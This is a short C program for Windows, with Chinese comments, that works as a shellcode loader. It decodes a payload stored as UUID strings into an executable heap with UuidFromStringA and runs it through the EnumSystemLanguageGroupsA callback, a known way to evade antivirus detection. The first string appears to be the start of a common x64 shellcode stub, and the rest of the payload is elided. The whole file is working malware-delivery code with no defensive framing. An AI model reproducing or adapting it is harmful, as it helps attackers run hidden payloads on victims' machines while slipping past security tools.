#include <Windows.h>
#include <rpc.h>
#pragma comment(lib,"Rpcrt4.lib")

const char* buf[] = {
	"e48348fc-e8f0-00c8-0000-415141505251",
	"..."
};


int main(int argc, char* argv[]) {

	int dwNum = sizeof(buf) / sizeof(buf[0]);

	HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);	// // 创建句柄
	if (hMemory == NULL) {
		return -1;
	}
	PVOID pMemory = HeapAlloc(hMemory, 0, 1024);	// 申请内存空间

	DWORD_PTR CodePtr = (DWORD_PTR)pMemory;

	for (size_t i = 0; i < dwNum; i++)
	{
		if (CodePtr == NULL) {
			break;
		}
		RPC_STATUS	status = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);
		if (status != RPC_S_OK) {

			return -1;
		}
		CodePtr += 16;
	}

	if (pMemory == NULL) {
		return -1;
	}
	if (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, NULL) == FALSE) {
		// 加载成功
		return 0;
	}
	return 0;
}